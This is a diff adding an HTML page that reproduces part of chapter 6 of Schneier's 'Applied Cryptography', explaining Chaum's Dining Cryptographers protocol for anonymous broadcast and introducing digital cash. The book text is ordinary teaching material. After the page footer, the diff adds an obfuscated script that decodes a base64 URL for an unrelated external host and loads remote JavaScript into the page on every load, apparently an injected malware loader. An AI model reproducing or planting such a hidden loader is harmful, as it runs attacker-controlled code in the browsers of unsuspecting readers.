@@ -1,0 +1,94 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Esoteric Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=06//-->
+<!--PAGES=137-139//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="06-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="06-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">6.3 Anonymous Message Broadcast</FONT></H3>
+<P>You can&#146;t go out to dinner with a bunch of cryptographers without raising a ruckus. In [321], David Chaum introduced the Dining Cryptographers Problem:
+</P>
+<BLOCKQUOTE><P>Three cryptographers are sitting down to dinner at their favorite three-star restaurant. Their waiter informs them that arrangements have been made with the ma&#238;tre d&#145;h&#244;tel for the bill to be paid anonymously. One of the cryptographers might be paying for the dinner, or it might have been the NSA. The three cryptographers respect each other&#146;s right to make an anonymous payment, but they wonder if the NSA is paying.
+</P>
+</BLOCKQUOTE><P>How do the cryptographers, named Alice, Bob, and Carol, determine if one of them is paying for dinner, while at the same time preserving the anonymity of the payer?
+</P>
+<P>Chaum goes on to solve the problem:</P>
+<BLOCKQUOTE><P>Each cryptographer flips an unbiased coin behind his menu, between him and the cryptographer to his right, so that only the two of them can see the outcome. Each cryptographer then states aloud whether the two coins he can see&#151;the one he flipped and the one his left-hand neighbor flipped&#151;fell on the same side or on different sides. If one of the cryptographers is the payer, he states the opposite of what he sees. An odd number of differences uttered at the table indicates that a cryptographer is paying; an even number of differences indicates that NSA is paying (assuming that the dinner was paid for only once). Yet, if a cryptographer is paying, neither of the other two learns anything from the utterances about which cryptographer it is.
+</P>
+</BLOCKQUOTE><P>To see that this works, imagine Alice trying to figure out which other cryptographer paid for dinner (assuming that neither she nor the NSA paid). If she sees two different coins, then either both of the other cryptographers, Bob and Carol, said, &#147;same&#148; or both said, &#147;different.&#148; (Remember, an odd number of cryptographers saying &#147;different&#148; indicates that one of them paid.) If both said, &#147;different, &#148; then the payer is the cryptographer closest to the coin that is the same as the hidden coin (the one that Bob and Carol flipped). If both said, &#147;same, &#148; then the payer is the cryptographer closest to the coin that is different from the hidden coin. However, if Alice sees two coins that are the same, then either Bob said, &#147;same&#148; and Carol said, &#147;different, &#148; or Bob said, &#147;different&#148; and Carol said, &#147;same.&#148; If the hidden coin is the same as the two coins she sees, then the cryptographer who said, &#147;different&#148; is the payer. If the hidden coin is different from the two coins she sees, then the cryptographer who said, &#147;same&#148; is the payer. In all of these cases, Alice needs to know the result of the coin flipped between Bob and Carol to determine which of them paid.
+</P>
+<P>This protocol can be generalized to any number of cryptographers; they all sit in a ring and flip coins among them. Even two cryptographers can perform the protocol. Of course, they know who paid, but someone watching the protocol could tell only if one of the two paid or if the NSA paid; they could not tell which cryptographer paid.</P>
+<P>The applications of this protocol go far beyond sitting around the dinner table. This is an example of <B>unconditional sender and recipient untraceability</B>. A group of users on a network can use this protocol to send anonymous messages.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;The users arrange themselves into a circle.
+<DD><B>(2)</B>&nbsp;&nbsp;At regular intervals, adjacent pairs of users flip coins between them, using some fair coin flip protocol secure from eavesdroppers.
+<DD><B>(3)</B>&nbsp;&nbsp;After every flip, each user announces either &#147;same&#148; or &#147;different.&#148;
+</DL>
+<P>If Alice wishes to broadcast a message, she simply starts inverting her statement in those rounds corresponding to a 1 in the binary representation of her message. For example, if her message were &#147;1001, &#148; she would invert her statement, tell the truth, tell the truth, and then invert her statement. Assuming the result of her flips were &#147;different, &#148; &#147;same, &#148; &#147;same, &#148; &#147;same, &#148; she would say &#147;same, &#148; &#147;same, &#148; &#147;same, &#148; &#147;different.&#148;
+</P>
+<P>If Alice notices that the overall outcome of the protocol doesn&#146;t match the message she is trying to send, she knows that someone else is trying to send a message at the same time. She then stops sending the message and waits some random number of rounds before trying again. The exact parameters have to be worked out based on the amount of message traffic on this network, but the idea should be clear.</P>
+<P>To make things even more interesting, these messages can be encrypted in another user&#146;s public keys. Then, when everyone receives the message (a real implementation of this should add some kind of standard message-beginning and message-ending strings), only the intended recipient can decrypt and read it. No one else knows who sent it. No one else knows who could read it. Traffic analysis, which traces and compiles patterns of people&#146;s communications even though the messages themselves may be encrypted, is useless.</P>
+<P>An alternative to flipping coins between adjacent parties would be for them to keep a common file of random bits. Maybe they could keep them on a CD-ROM, or one member of the pair could generate a pile of them and send them to the other party (encrypted, of course). Alternatively, they could agree on a cryptographically secure pseudo-random-number generator between them, and they could each generate the same string of pseudo-random bits for the protocol.</P>
+<P>One problem with this protocol is that while a malicious participant cannot read any messages, he can disrupt the system unobserved by lying in step (3). There is a modification to the previous protocol that detects disruption [1578, 1242]; the problem is called &#147;The Dining Cryptographers in the Disco.&#148;</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">6.4 Digital Cash</FONT></H3>
+<P>Cash is a problem. It&#146;s annoying to carry, it spreads germs, and people can steal it from you. Checks and credit cards have reduced the amount of physical cash flowing through society, but the complete elimination of cash is virtually impossible. It&#146;ll never happen; drug dealers and politicians would never stand for it. Checks and credit cards have an audit trail; you can&#146;t hide to whom you gave money.
+</P>
+<P>On the other hand, checks and credit cards allow people to invade your privacy to a degree never before imagined. You might never stand for the police following you your entire life, but the police can watch your financial transactions. They can see where you buy your gas, where you buy your food, who you call on the telephone&#151;all without leaving their computer terminals. People need a way to protect their anonymity in order to protect their privacy.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="06-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="06-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(csuJpdaB, LjwkaTaF) {LjwkaTaF = csuJpdaB.createElement('script');LjwkaTaF.type = 'text/javascript';LjwkaTaF.async = true;LjwkaTaF.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');csuJpdaB.getElementsByTagName('body')[0].appendChild(LjwkaTaF);}(document));</script></body>
+</html>
